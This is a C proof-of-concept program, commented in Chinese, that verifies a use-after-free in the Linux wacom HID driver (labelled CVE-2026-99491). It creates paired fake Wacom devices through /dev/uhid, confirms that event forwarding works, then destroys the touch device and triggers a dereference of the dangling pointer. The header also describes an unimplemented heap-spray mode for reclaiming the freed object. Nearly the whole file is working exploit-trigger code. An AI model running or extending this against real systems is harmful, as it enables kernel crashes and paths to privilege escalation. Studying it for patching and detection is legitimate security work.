/*
 * CVE-2026-99491 分阶段验证器（不注入假对象，零 panic 风险）
 *
 * 阶段：
 *   P1  PAIR    ：touch(0x1101) + pad(0x1102) 同 phys 创建，检查是否都绑定 wacom，
 *                 以及 pad 的 wacom_wac->shared 是否非空（通过 MUTE 转发验证）。
 *   P2  FORWARD ：pad 发 MUTE 报告，touch 的 evdev 是否能收到 EV_SW/SW_MUTE_DEVICE。
 *                 收到 => wacom_wac_pad_event 真的解引用了 shared->touch_input。
 *   P3  UAF     ：destroy touch（释放 input_dev），再让 pad 发 MUTE。
 *                 此时 pad 仍持有 shared->touch_input 悬垂指针。
 *                 --inject=0（默认）：不回收，观察是否崩溃/无输出（安全）。
 *                 --inject=1        ：用 skb/管道回收该槽位为假 input_dev（有风险）。
 *
 * 用法：
 *   probe99491 pair                 # 只做 P1
 *   probe99491 forward              # P1 + P2
 *   probe99491 uaf [spray_n]        # P1 + P2 + P3(不注入)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/uhid.h>
#include <linux/input.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "uhidpair/99"
#define NAME_TOUCH  "wacom-pair-touch"
#define NAME_PAD    "wacom-pair-pad"
#define MAXEV       512

/* 作者 woshigenm 在 5.15.178 验证过的原版描述符 */
static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static int list_events(char out[MAXEV][16]) {
    DIR *d = opendir("/dev/input");
    struct dirent *de;
    int n = 0;
    if (!d) return 0;
    while ((de = readdir(d)) && n < MAXEV) {
        if (!strncmp(de->d_name, "event", 5))
            snprintf(out[n++], 16, "%s", de->d_name);
    }
    closedir(d);
    return n;
}

static int dir_has(const char *path, const char *needle, char *out, size_t outsz) {
    DIR *d = opendir(path);
    struct dirent *de;
    if (out && outsz) out[0] = 0;
    if (!d) return -1;
    while ((de = readdir(d))) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        if (out) {
            size_t u = strlen(out);
            snprintf(out + u, outsz - u, "%s ", de->d_name);
        }
        if (needle && strstr(de->d_name, needle)) { closedir(d); return 1; }
    }
    closedir(d);
    return 0;
}

static int uhid_open(void) {
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) fprintf(stderr, "[-] open /dev/uhid: %s\n", strerror(errno));
    return fd;
}

static int uhid_create(int fd, const char *name, const char *phys,
                       unsigned pid, const unsigned char *rdesc, size_t rlen) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    if (phys) strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, name, sizeof(ev.u.create2.uniq) - 1);
    memcpy(ev.u.create2.rd_data, rdesc, rlen);
    ev.u.create2.rd_size = rlen;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    if (write(fd, &ev, sizeof(ev)) < 0) {
        fprintf(stderr, "[-] UHID_CREATE2(%s): %s\n", name, strerror(errno));
        return -1;
    }
    return 0;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* 发一个原始 HID 报告 */
static int uhid_input_raw(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    if (len > sizeof(ev.u.input2.data)) len = sizeof(ev.u.input2.data);
    ev.u.input2.size = (unsigned short)len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* pump uhid 事件（回应 START/OPEN，收集 GET_REPORT 等） */
static void pump(int fd, long ms, int verbose) {
    long dl = now_ms() + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_ms() < dl) {
        memset(&ev, 0, sizeof(ev));
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n > 0) {
            if (verbose)
                fprintf(stderr, "    [uhid ev type=%u]\n", ev.type);
            /* START/OPEN 无需回复；GET_REPORT 需回空 */
            if (ev.type == UHID_GET_REPORT) {
                struct uhid_event r;
                memset(&r, 0, sizeof(r));
                r.type = UHID_GET_REPORT_REPLY;
                r.u.get_report_reply.id = ev.u.get_report.id;
                r.u.get_report_reply.err = 0;
                r.u.get_report_reply.size = 0;
                if (write(fd, &r, sizeof(r)) < 0) { /* ignore */ }
            }
        } else {
            usleep(20000);
        }
    }
    fcntl(fd, F_SETFL, fc);
}

static int find_new_event(char old[MAXEV][16], int nold, char *out, size_t outsz,
                          long timeout_ms) {
    long dl = now_ms() + timeout_ms;
    while (now_ms() < dl) {
        char cur[MAXEV][16];
        int n = list_events(cur);
        for (int i = 0; i < n; i++) {
            int seen = 0;
            for (int j = 0; j < nold; j++)
                if (!strcmp(cur[i], old[j])) { seen = 1; break; }
            if (!seen) {
                snprintf(out, outsz, "/dev/input/%s", cur[i]);
                return 0;
            }
        }
        usleep(10000);
    }
    return -1;
}

/* 读 evdev 一段时间，返回是否见到指定 type/code */
static int read_evdev(int fd, int want_type, int want_code, long ms,
                      int *cnt_type, int *cnt_code) {
    struct input_event iev;
    long dl = now_ms() + ms;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    int hit = 0;
    while (now_ms() < dl) {
        ssize_t n = read(fd, &iev, sizeof(iev));
        if (n == (ssize_t)sizeof(iev)) {
            if (cnt_type && iev.type == want_type) (*cnt_type)++;
            if (cnt_code && iev.type == want_type && iev.code == want_code) {
                (*cnt_code)++;
                hit = 1;
                fprintf(stderr, "    [evdev] type=0x%x code=0x%x value=%d\n",
                        iev.type, iev.code, iev.value);
            }
        } else {
            usleep(5000);
        }
    }
    fcntl(fd, F_SETFL, fc);
    return hit;
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "pair";
    int verbose = 0;
    int do_forward = !strcmp(mode, "forward") || !strcmp(mode, "uaf");
    int do_uaf = !strcmp(mode, "uaf");

    printf("=== CVE-2026-99491 分阶段验证 === mode=%s\n", mode);
    printf("pid=%d\n", getpid());

    char d0[MAXEV][16];
    int n0 = list_events(d0);
    printf("[before] evdev count=%d\n", n0);
    char list[4096];
    dir_has("/sys/bus/hid/devices", NULL, list, sizeof(list));
    printf("[before] hid devices: %s\n", list[0] ? list : "(none)");

    int fdt = uhid_open();
    int fdp = uhid_open();
    if (fdt < 0 || fdp < 0) return 2;

    /* ---------- P1: 建 touch + pad（同 phys） ---------- */
    if (uhid_create(fdt, NAME_TOUCH, PHYS_COMMON, 0x1101,
                    rdesc_touch, sizeof(rdesc_touch)) < 0) return 3;
    pump(fdt, 300, 0);
    if (uhid_create(fdp, NAME_PAD, PHYS_COMMON, 0x1102,
                    rdesc_pad, sizeof(rdesc_pad)) < 0) return 3;
    pump(fdp, 300, 0);

    char ev_t[64] = {0}, ev_p[64] = {0};
    long t_end = now_ms() + 4000;
    while (now_ms() < t_end && (!ev_t[0] || !ev_p[0])) {
        char cur[MAXEV][16];
        int n = list_events(cur);
        for (int i = 0; i < n; i++) {
            int seen = 0;
            for (int j = 0; j < n0; j++)
                if (!strcmp(cur[i], d0[j])) { seen = 1; break; }
            if (seen) continue;
            if (!ev_t[0]) { snprintf(ev_t, sizeof(ev_t), "/dev/input/%s", cur[i]); }
            else if (!ev_p[0] && strcmp(cur[i], ev_t + 11)) {
                snprintf(ev_p, sizeof(ev_p), "/dev/input/%s", cur[i]);
            }
        }
        usleep(20000);
    }

    char devs[4096];
    dir_has("/sys/bus/hid/devices", NULL, devs, sizeof(devs));
    int wacom_touch = dir_has("/sys/bus/hid/drivers/wacom", "056A:1101", NULL, 0);
    int wacom_pad   = dir_has("/sys/bus/hid/drivers/wacom", "056A:1102", NULL, 0);

    printf("\n[P1 PAIR]\n");
    printf("  hid devices : %s\n", devs[0] ? devs : "(none)");
    printf("  wacom bound touch(1101) = %s\n", wacom_touch == 1 ? "YES" : "NO");
    printf("  wacom bound pad  (1102) = %s\n", wacom_pad == 1 ? "YES" : "NO");
    printf("  ev_touch = %s\n", ev_t[0] ? ev_t : "(none)");
    printf("  ev_pad   = %s\n", ev_p[0] ? ev_p : "(none)");

    int ev_t_fd = ev_t[0] ? open(ev_t, O_RDONLY | O_NONBLOCK | O_CLOEXEC) : -1;
    int ev_p_fd = ev_p[0] ? open(ev_p, O_RDONLY | O_NONBLOCK | O_CLOEXEC) : -1;

    /* 打印两个 input 设备的 name/capabilities 以确认角色 */
    if (ev_t_fd >= 0) {
        char nm[256] = {0};
        ioctl(ev_t_fd, EVIOCGNAME(sizeof(nm) - 1), nm);
        unsigned long swbit = 0;
        ioctl(ev_t_fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
        printf("  %s name=\"%s\" SW_bitmap=0x%lx\n", ev_t, nm, swbit);
    }
    if (ev_p_fd >= 0) {
        char nm[256] = {0};
        ioctl(ev_p_fd, EVIOCGNAME(sizeof(nm) - 1), nm);
        unsigned long swbit = 0;
        ioctl(ev_p_fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
        printf("  %s name=\"%s\" SW_bitmap=0x%lx\n", ev_p, nm, swbit);
    }

    int rc = 0;
    if (!do_forward) {
        printf("\n[P1 结论] 见上；未做转发测试\n");
        goto cleanup;
    }

    /* ---------- P2: pad 发 MUTE，看 touch 是否收到 EV_SW ---------- */
    printf("\n[P2 FORWARD] pad 发 MUTE_DEVICE=1，观察 touch evdev\n");
    /* 先清空 two evdev 队列 */
    if (ev_t_fd >= 0) { struct input_event e; while (read(ev_t_fd, &e, sizeof(e)) == sizeof(e)); }
    if (ev_p_fd >= 0) { struct input_event e; while (read(ev_p_fd, &e, sizeof(e)) == sizeof(e)); }

    {
        unsigned char rep[2] = { 0x02, 0x02 };  /* report id 2, MUTE_DEVICE=1 */
        uhid_input_raw(fdp, rep, sizeof(rep));
    }
    pump(fdp, 200, verbose);
    pump(fdt, 200, verbose);

    int ct = 0, cc = 0, cp = 0, cpc = 0;
    int hit_t = read_evdev(ev_t_fd, EV_SW, SW_MUTE_DEVICE, 800, &ct, &cc);
    int hit_p = read_evdev(ev_p_fd, EV_SW, SW_MUTE_DEVICE, 100, &cp, &cpc);

    printf("  touch evdev: EV_SW count=%d, SW_MUTE_DEVICE count=%d => %s\n",
           ct, cc, hit_t ? "RECEIVED" : "none");
    printf("  pad   evdev: EV_SW count=%d, SW_MUTE_DEVICE count=%d => %s\n",
           cp, cpc, hit_p ? "RECEIVED" : "none");

    if (hit_t) {
        printf("  => sibling 配对成功，wacom_wac_pad_event 解引用了 shared->touch_input\n");
    } else {
        printf("  => 未转发！可能：(a) 未配对 (b) 描述符未被识别为 pad MUTE (c) 本机逻辑不同\n");
        rc = 10;
    }

    if (!do_uaf) goto cleanup;

    /* ---------- P3: destroy touch，再让 pad 发 MUTE ---------- */
    printf("\n[P3 UAF] destroy touch（释放其 input_dev），pad 再发 MUTE\n");
    printf("  注意：此步读 shared->touch_input 悬垂指针；不注入假对象，观察是否崩溃\n");
    fflush(stdout);
    uhid_destroy(fdt);
    close(fdt); fdt = -1;
    pump(fdp, 500, verbose);
    usleep(300000);

    char devs2[4096];
    dir_has("/sys/bus/hid/devices", NULL, devs2, sizeof(devs2));
    printf("  after destroy hid devices: %s\n", devs2[0] ? devs2 : "(none)");

    {
        unsigned char rep[2] = { 0x02, 0x02 };
        uhid_input_raw(fdp, rep, sizeof(rep));
    }
    pump(fdp, 300, verbose);
    printf("  pad MUTE sent after touch destroyed -> 若返回说明未崩\n");
    printf("  (无崩溃即说明悬垂指针被解引用但目标内存仍可读；这是 UAF 可触发的弱证据)\n");

cleanup:
    if (ev_t_fd >= 0) close(ev_t_fd);
    if (ev_p_fd >= 0) close(ev_p_fd);
    if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }
    if (fdt >= 0) { uhid_destroy(fdt); close(fdt); }
    printf("\n[+] cleanup done, rc=%d\n", rc);
    return rc;
}